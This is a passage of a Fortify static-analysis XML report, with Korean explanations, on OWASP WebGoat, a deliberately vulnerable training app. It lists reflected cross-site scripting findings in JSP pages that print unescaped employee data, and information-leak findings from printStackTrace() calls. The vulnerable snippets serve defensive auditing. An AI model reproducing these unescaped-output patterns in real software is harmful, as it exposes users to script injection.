<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0556A3085432493E81674E43C6B792F7" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;%=employee.getLastName()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EDE95757F99C8A1852058EA5E14FDEB0" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getStartDate()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8BEA594A6DA1CEC85F3692105B751F4B" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WSDLScanning.java의 createContent() 메서드가 219 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>219</LineStart>
<Snippet>	    for (int i = 0; i &lt; fields.length; i++)
	    {
		header.addElement(new TD().addElement(fields[i]));
		results.addElement(new TD()
			.addElement((String) accessWGService("WSDLScanning",</Snippet>
<TargetFunction>org.apache.ecs.html.TD.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>593</LineStart>
<Snippet>	}

	return request.getParameterValues(name);
    }
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D442512DA3C2F1304F896FBB497F167C" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 99 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>99</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F018483F9B42FBF44AFD43584CB5F6E1" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 95 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>95</LineStart>
<Snippet>				&lt;TR&gt;
					&lt;TD colspan="4"&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CF4D79D6ECEA7998194561B38D23AA15" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 123 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>123</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=SQLInjection.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=SQLInjection.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=SQLInjection.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="064DA9D14AC4BADBF93005F8FFC020DA" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 16 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>16</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD width="193"&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.FIRST_NAME%&gt;" type="text" value="&lt;%=employee.getFirstName()%&gt;"/&gt;
				  &lt;/TD&gt;
					&lt;TD width="110"&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="192">
                        <groupTitle>System Information Leak</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>HammerHead.java의 doPost() 함수는 192 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>정보 누출은 시스템 데이터 또는 디버그 정보가 출력 스트림이나 로깅 함수를 통해 프로그램을 벗어날 때 발생합니다.



예제 1: 다음 코드는 표준 오류 스트림에 예외 사항을 작성합니다.


try {
    ...
} catch (Exception e) {
    e.printStackTrace();
}


시스템 구성에 따라 이 정보는 콘솔에 덤프되거나 로그 파일에 작성되거나 원격 사용자에게 노출될 수 있습니다. 예를 들어, 스크립팅 메커니즘을 사용하면 "표준 오류" 또는 "표준 출력"에서 파일이나 다른 프로그램으로 출력 정보를 간단하게 리디렉션할 수 있습니다. 또는 프로그램이 실행되는 시스템에는 로그를 원격 장치로 전송하는 "syslog" 서버와 같은 원격 로깅 메커니즘이 있을 수 있습니다. 개발 단계에서는 이 정보가 어디에 표시될지 알 방법이 없습니다.

경우에 따라 오류 메시지가 공격자에게 시스템이 취약한 정확한 공격 유형을 알려주기도 합니다. 예를 들어, 데이터베이스 오류 메시지가 응용 프로그램이 SQL injection 공격에 취약하다는 것을 드러낼 수 있습니다. 다른 오류 메시지도 비교적 모호하지만 시스템에 대한 단서를 제공합니다. Example 1에서는 누출된 정보가 운영 체제의 종류, 시스템에 설치된 응용 프로그램 및 관리자가 프로그램 구성에 들인 관심의 정도에 대한 정보를 암시할 수 있습니다.

모바일 환경과 관련된 시나리오를 하나 더 소개하겠습니다. 현재 대부분의 모바일 장치는 무선 통신을 사용하는 장치 간에 정보를 빠르게 교환할 수 있도록 NFC(근거리 통신) 프로토콜을 구현합니다. NFC 프로토콜은 장치를 근접하게 또는 서로 접촉하도록 배치하는 방식으로 작동합니다. NFC의 통신 범위는 불과 몇 센티미터 정도로 제한되지만 NFC만 사용해서는 보안 통신이 보장되지 않으므로 도청, 데이터 수정 및 기타 다양한 유형의 공격을 할 수 있습니다.

예제 2: Android 플랫폼에서는 NFC가 지원됩니다. 다음 코드는 범위 내의 다른 장치로 푸시되는 메시지를 생성합니다.

...
public static final String TAG = "NfcActivity";
private static final String DATA_SPLITTER = "__:DATA:__";
private static final String MIME_TYPE = "application/my.applications.mimetype";
...
public NdefMessage createNdefMessage(NfcEvent event) {
    TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE);
    String VERSION = tm.getDeviceSoftwareVersion();
    String text = TAG + DATA_SPLITTER + VERSION;
    NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA,
            MIME_TYPE.getBytes(), new byte[0], text.getBytes());
    NdefRecord[] records = { record };
    NdefMessage msg = new NdefMessage(records);
    return msg;
}
...


NDEF(NFC 데이터 교환 형식) 메시지에는 형식화된 데이터, URI 또는 사용자 지정 응용 프로그램 페이로드가 포함됩니다. 메시지에 응용 프로그램 이름, MIME 유형 또는 장치 소프트웨어 버전 같은 응용 프로그램 관련 정보가 포함되어 있으면 도청자에게 해당 정보가 노출될 수 있습니다. Example 2에서 Fortify Static Code Analyzer는 return 문에서 system information leak 취약성을 보고합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>오류 메시지를 쓸 때는 항상 보안을 염두에 두어야 합니다. 운영 환경에서는 자세한 오류 정보 대신 간단한 메시지를 사용합니다. 관리자와 프로그래머가 문제를 진단하는 데 도움이 되는 상세한 출력의 생성 및 저장은 삼가는 것이 좋습니다. 디버깅 추적은 때에 따라 엉뚱한 곳에 나타날 수 있습니다(예: 오류 페이지의 HTML에서 주석에 포함됨).

스택 추적이나 데이터베이스 덤프를 나타내지 않는 간결한 오류 메시지도 공격자에게 도움을 줍니다. 예를 들어, "접근 거부" 메시지는 시스템에 파일이나 사용자가 존재한다는 것을 나타냅니다.

Android 장치에서 NFC를 통한 시스템 데이터 누출이 염려되면 다음의 세 가지 작업 중 하나를 수행하면 됩니다. 즉 범위 내에 있는 다른 장치로 푸시되는 메시지에 시스템 데이터를 포함하지 않거나, 메시지 페이로드를 암호화하거나, 상위 계층에 보안 통신 채널을 설정합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. System information leak을 예방하는 데 래퍼 스크립트, 회사 IT 정책 또는 빠른 판단력을 가진 시스템 관리자에만 의존하지 마십시오. 자체적으로 안전한 소프트웨어를 작성해야 합니다.

2. 이 카테고리의 취약점은 모든 유형의 프로그램에 적용되지 않습니다. 예를 들어, 응용 프로그램이 공격자가 이미 시스템 정보를 확보한 클라이언트 시스템에서 실행되거나 시스템 정보를 신뢰할 수 있는 로그 파일에만 인쇄하는 경우, Audit Guide를 사용하여 스캔 결과에서 이 카테고리의 취약점을 필터링할 수 있습니다.

3. Fortify AppDefender adds protection against this category.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>192</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="29F8047D0743AF3156E0715069C95333" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>DeleteProfile.java의 deleteEmployeeProfile() 함수는 126 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DeleteProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/DeleteProfile.java</FilePath>
<LineStart>126</LineStart>
<Snippet>	{
	    s.setMessage("Error deleting employee profile");
	    e.printStackTrace();
	}
    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BF7CEA65EB8E52B7BA7F9689AD3E7318" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>CreateDB.java의 main() 함수는 126 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CreateDB.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/CreateDB.java</FilePath>
<LineStart>126</LineStart>
<Snippet>	catch (SQLException sqle)
	{
	    sqle.printStackTrace();
	}
    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0A84CFB7DBE148BCA531CBABA1A42650" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ListStaff.java의 getAllEmployees() 함수는 115 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>115</LineStart>
<Snippet>	    {
		s.setMessage("Error getting employees");
		sqle.printStackTrace();
	    }
	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="23B0D96DBFC08A66930F5E2F13D76E31" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Encoding.java의 hashMD5() 함수는 646 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>646</LineStart>
<Snippet>		{
			// it's got to be there
			e.printStackTrace();
		}
		return ( base64Encode( md.digest() ) );</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B9BF1DFE73632286CCBD9DB579BF1F6C" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>ThreadSafetyProblem.java의 createContent() 함수는 128 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ThreadSafetyProblem.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ThreadSafetyProblem.java</FilePath>
<LineStart>128</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D91B3091E8E264DF8C6FF60BC35600BA" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Challenge2Screen.java의 isDefaced() 함수는 390 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>390</LineStart>
<Snippet>	catch (Exception e)
	{
	    e.printStackTrace();
	}
	return defaced;</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D9E6C19FF94A89C45637A61042D0DCF4" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 handleRequest() 함수는 351 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>351</LineStart>
<Snippet>	    s.setMessage("Login failed");
	    System.out.println("Authentication failure");
	    ue.printStackTrace();
	}
	catch (UnauthorizedException ue2)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="820D9127C18956E39B7BFD623247D3DA" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 handleRequest() 함수는 110 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>110</LineStart>
<Snippet>	    {
		System.out.println("Internal server error");
		ue1.printStackTrace();
	    }
	    catch (UnauthorizedException ue2)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="74C884820E4739861A03F8B6D623275D" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>XPATHInjection.java의 createContent() 함수는 202 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>XPATHInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/XPATHInjection.java</FilePath>
<LineStart>202</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
	catch (IllegalArgumentException e)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="9BCB204A4306E1E6CB007BE7A2EE0468" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>WSDLScanning.java의 accessWGService() 함수는 159 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>159</LineStart>
<Snippet>	catch (ServiceException e)
	{
	    e.printStackTrace();
	}
	catch (Exception e)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4D29817A94B639966ABCDE67289F0FAB" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>Interceptor.java의 doFilter() 함수는 110 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Interceptor.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Interceptor.java</FilePath>
<LineStart>110</LineStart>
<Snippet>	catch (UnknownHostException e)
	{
	    e.printStackTrace();

	}</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3A34FB4634245DAC8FB32F4AEBABD802" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 handleRequest_BACKUP() 함수는 432 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>432</LineStart>
<Snippet>	    {
		System.out.println("Missing parameter");
		pnfe.printStackTrace();
		setCurrentAction(s, ERROR_ACTION);
	    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D9A6AE2AC85C0E39449C242C052F302B" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 createEmployeeProfile_BACKUP() 함수는 393 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>393</LineStart>
<Snippet>	{
	    s.setMessage("Error updating employee profile");
	    e.printStackTrace();
	}
    }</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E4EB3C3CC86A124D05029C605EAFE89D" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>UpdateProfile.java의 handleRequest() 함수는 125 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>125</LineStart>
<Snippet>	    {
		System.out.println("Internal server error");
		ue1.printStackTrace();
	    }
	    catch (UnauthorizedException ue2)</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2B04DD17B5D46FB70C0FD974CE08F0CD" ruleID="FE4EADF2-7055-4C36-863E-5A01C4A0E1A4">
                            <Category>System Information Leak</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>WsSAXInjection.java의 createContent() 함수는 166 줄의 printStackTrace()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. printStackTrace()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WsSAXInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSAXInjection.java</FilePath>
<LineStart>166</LineStart>
<Snippet>	{
	    s.setMessage("Error generating " + this.getClass().getName());
	    e.printStackTrace();
	}
	return (ec);</Snippet>
<TargetFunction>printStackTrace()</TargetFunction>
                            </Primary>
                        </Issue>
